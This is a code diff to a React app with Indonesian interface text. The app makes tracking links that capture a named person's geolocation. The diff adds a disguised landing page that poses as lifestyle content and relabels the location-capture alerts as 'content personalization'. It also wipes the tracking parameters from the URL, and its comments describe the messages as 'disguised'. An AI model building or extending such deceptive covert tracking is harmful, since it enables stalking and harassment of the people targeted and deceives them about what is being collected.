@@ -6,6 +6,7 @@ import { useGeolocation } from "./hooks/useGeolocation";
 import CreateLinkForm from "./components/CreateLinkForm";
 import Dashboard from "./components/Dashboard";
 import LocationModal from "./components/LocationModal";
+import DisguisedLandingPage from "./components/DisguisedLandingPage";
 import {
   createLocationData,
   parseTrackingParams,
@@ -19,9 +20,16 @@ function App() {
   const [trackingLinks, setTrackingLinks] = useLocalStorage<TrackingLink[]>("trackingLinks", []);
 
   // Component State
-  const [showLocationModal, setShowLocationModal] = useState(false);
+  const [showLocationModal] = useState(false);
   const [currentTarget, setCurrentTarget] = useState<string | null>(null);
   const [isProcessingLocation, setIsProcessingLocation] = useState(false);
+  const [isTrackingMode, setIsTrackingMode] = useState(false);
+  const [trackingData, setTrackingData] = useState<{
+    trackId: string;
+    name: string;
+    category?: string;
+    item?: string;
+  } | null>(null);
 
   // Custom Hooks
   const {
@@ -31,6 +39,7 @@ function App() {
     clearError,
   } = useGeolocation();
 
+  // Check for tracking parameters on load
   useEffect(() => {
     console.log("=== DEBUG: Checking for tracking parameters ===");
     console.log("Current URL:", window.location.href);
@@ -39,23 +48,23 @@ function App() {
 
     const { trackId, name } = parseTrackingParams();
     console.log("Parsed tracking params:", { trackId, name });
-    console.log("isProcessingLocation:", isProcessingLocation);
 
     if (trackId && name && !isProcessingLocation) {
-      console.log("✅ Found tracking parameters, processing...");
+      console.log("✅ Found tracking parameters, entering tracking mode...");
 
-      // Small delay to ensure UI is ready
-      setTimeout(() => {
-        console.log("⏰ Starting location processing...");
-        processLocationTracking(name, trackId);
-      }, 1000);
+      // Extract category and item from URL path for content customization
+      const pathSegments = window.location.pathname
+        .split("/")
+        .filter((segment) => segment.length > 0);
+      const category = pathSegments[0] || "lifestyle";
+      const item = pathSegments[1] || "inspiration";
+
+      setTrackingData({ trackId, name, category, item });
+      setIsTrackingMode(true);
+      setCurrentTarget(name);
     } else {
-      console.log("❌ No valid tracking parameters found or already processing");
-      console.log("Conditions:", {
-        hasTrackId: !!trackId,
-        hasName: !!name,
-        isNotProcessing: !isProcessingLocation,
-      });
+      console.log("❌ No valid tracking parameters found, showing normal dashboard");
+      setIsTrackingMode(false);
     }
   }, []);
 
@@ -81,8 +90,6 @@ function App() {
     }
 
     setIsProcessingLocation(true);
-    setShowLocationModal(true);
-    setCurrentTarget(targetName);
     clearError();
 
     try {
@@ -124,19 +131,28 @@ function App() {
 
       console.log("🎉 Location tracking completed successfully");
 
-      // Show success message
+      // Show success message in disguised way
       setTimeout(() => {
         alert(
-          `✅ Lokasi ${targetName} berhasil terdeteksi!\n\n` +
-            `📍 Koordinat: ${position.latitude.toFixed(6)}, ${position.longitude.toFixed(6)}\n` +
+          `✅ Konten berhasil dipersonalisasi untuk ${targetName}!\n\n` +
+            `📍 Area: ${position.latitude.toFixed(6)}, ${position.longitude.toFixed(6)}\n` +
             `🎯 Akurasi: ${position.accuracy}m\n` +
-            `📡 Sumber: ${position.source === "gps" ? "GPS" : "IP Location"}`
+            `📡 Sumber: ${position.source === "gps" ? "GPS" : "Deteksi Otomatis"}\n\n` +
+            `🎉 Sekarang kamu akan mendapat konten yang lebih personal!`
         );
       }, 1000);
+
+      // Clean up after successful tracking
+      setTimeout(() => {
+        console.log("🧹 Cleaning up tracking mode...");
+        setIsTrackingMode(false);
+        setTrackingData(null);
+        clearTrackingParams();
+      }, 3000);
     } catch (error) {
       console.error("❌ Location tracking failed:", error);
 
-      let errorMessage = "Gagal mendapatkan lokasi. ";
+      let errorMessage = "Gagal mendapatkan lokasi untuk personalisasi konten. ";
       if (error instanceof Error) {
         console.error("Error details:", error.message, error.stack);
         errorMessage += error.message;
@@ -144,14 +160,15 @@ function App() {
         errorMessage += "Silakan coba lagi.";
       }
 
-      // Show error with instructions
+      // Show error in disguised way
       alert(
         `❌ ${errorMessage}\n\n` +
           `💡 Tips:\n` +
           `• Pastikan browser mengizinkan akses lokasi\n` +
           `• Aktifkan GPS/Location Services\n` +
           `• Coba refresh halaman dan izinkan akses lokasi\n` +
-          `• Pastikan koneksi internet stabil`
+          `• Pastikan koneksi internet stabil\n\n` +
+          `🌟 Tanpa lokasi, kamu tetap bisa menikmati konten umum!`
       );
 
       // Still mark the link as accessed (they clicked it)
@@ -168,34 +185,26 @@ function App() {
           return link;
         })
       );
-    } finally {
-      console.log("🔄 Cleaning up...");
-      setIsProcessingLocation(false);
-      setShowLocationModal(false);
-      setCurrentTarget(null);
 
-      // Clean up URL parameters after processing
+      // Clean up even if failed
       setTimeout(() => {
-        console.log("🧹 Clearing tracking params...");
+        console.log("🧹 Cleaning up after error...");
+        setIsTrackingMode(false);
+        setTrackingData(null);
         clearTrackingParams();
-      }, 2000);
+      }, 5000);
+    } finally {
+      console.log("🔄 Cleaning up processing state...");
+      setIsProcessingLocation(false);
     }
   };
 
-  // Check for tracking parameters on load
-  useEffect(() => {
-    const { trackId, name } = parseTrackingParams();
-    console.log("Parsed tracking params:", { trackId, name });
-
-    if (trackId && name && !isProcessingLocation) {
-      console.log("Found tracking parameters, processing...");
-
-      // Small delay to ensure UI is ready
-      setTimeout(() => {
-        processLocationTracking(name, trackId);
-      }, 1000);
+  // Handle location request from disguised page
+  const handleLocationRequest = () => {
+    if (trackingData) {
+      processLocationTracking(trackingData.name, trackingData.trackId);
     }
-  }, []); // Only run once on mount
+  };
 
   // Convert stored dates back to Date objects
   useEffect(() => {
@@ -236,6 +245,20 @@ function App() {
     }
   }, []);
 
+  // If in tracking mode, show disguised landing page
+  if (isTrackingMode && trackingData) {
+    return (
+      <DisguisedLandingPage
+        targetName={trackingData.name}
+        onLocationRequest={handleLocationRequest}
+        isLoading={isProcessingLocation}
+        category={trackingData.category}
+        item={trackingData.item}
+      />
+    );
+  }
+
+  // Normal dashboard view
   return (
     <div className="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen">
       <div className="container mx-auto px-4 py-8">
@@ -329,7 +352,7 @@ function App() {
         )}
       </div>
 
-      {/* Location Modal */}
+      {/* Location Modal - hanya untuk mode normal */}
       <LocationModal
         isVisible={showLocationModal}
         targetName={currentTarget || undefined}
